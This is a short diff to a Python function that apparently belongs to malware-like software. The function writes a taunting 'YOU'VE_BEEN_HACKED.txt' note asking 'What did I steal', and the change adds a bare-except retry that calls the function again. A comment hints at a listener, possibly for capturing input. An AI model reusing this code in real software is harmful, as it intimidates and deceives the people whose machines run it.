@@ -60,7 +60,12 @@ def warning_text():
             f'What did I steal: Whatever you could give me ;) \n'
         h.write(t)
         shutil.copy("trollface", "YOU'VE_BEEN_HACKED.txt")
-        shutil.move('YOU\'VE_BEEN_HACKED.txt', warntxt)
+        try:
+            shutil.move('YOU\'VE_BEEN_HACKED.txt', warntxt)
+            h.close()
+        except:
+            os.remove(warntxt + 'YOU\'VE_BEEN_HACKED.txt')
+            warning_text()
 
 
 # Sets up the Listener instance and joins the listener in the main thread
